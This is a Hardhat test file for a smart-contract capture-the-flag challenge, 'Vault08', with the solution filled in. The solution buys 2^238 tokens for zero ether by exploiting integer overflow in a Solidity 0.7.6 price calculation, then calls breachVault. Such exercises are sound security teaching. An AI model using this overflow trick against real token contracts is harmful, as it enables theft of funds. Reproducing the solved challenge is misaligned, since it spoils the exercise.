const { expect } = require("chai");
const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");

/**
 * Test Suite for the Vault08: Tokens for Free
 */
describe("Vault08 Test Suite", function () {
  let vault;
  let player;
  let playerAddress;
  const PLAYER_INITIAL_ETH = ethers.parseEther("1"); // Starting ETH balance for player

  before("Set up the challenge", async function () {
    /** DO NOT CHANGE ANYTHING HERE */

    // Get test accounts
    [deployer, player] = await ethers.getSigners();

    // Get the player's address
    playerAddress = await player.getAddress();

    // Deploy Vault contract
    vault = await ethers.deployContract("Vault08");
    await vault.waitForDeployment();

    console.log("Vault08 deployed at:", vault.target);
    console.log("Player address:", playerAddress);

    // Set up player's initial balances
    await setBalance(player.address, PLAYER_INITIAL_ETH);

    // Verify player's balance
    expect(await ethers.provider.getBalance(player.address)).to.equal(
      PLAYER_INITIAL_ETH
    );
  });

  /**
   * Test case for the player to breach the vault
   */
  it("Execution of the player's code", async function () {
    // Connect to the vault contract as the player
    const playerVault = vault.connect(player);

    // Calculate the token amount that will cause an overflow
    // 2^238 is chosen because when multiplied by 1 ether (10^18),
    // it will overflow exactly to 0 in Solidity 0.7.6
    const numTokens = BigInt(1) << BigInt(238);

    // Call buyTokens with 0 ether value
    // Due to integer overflow, numTokens * TOKEN_PRICE will be 0
    await playerVault.buyTokens(numTokens, { value: 0 });

    // Verify that we received the tokens
    const playerBalance = await vault.tokenBalances(playerAddress);
    console.log("Player token balance:", playerBalance.toString());

    // Call breachVault to complete the challenge
    await playerVault.breachVault();
  });

  after("Success conditions", async function () {
    /** DO NOT CHANGE ANYTHING HERE */

    // Expect the last solver to be the player
    expect(await vault.lastSolver(), "Last solver is not the player").to.equal(
      playerAddress
    );

    // Expect the player to have at least 1,000,000 tokens
    expect(
      await vault.tokenBalances(playerAddress),
      "Player doesn't have enough tokens"
    ).to.be.at.least(1_000_000);
  });
});
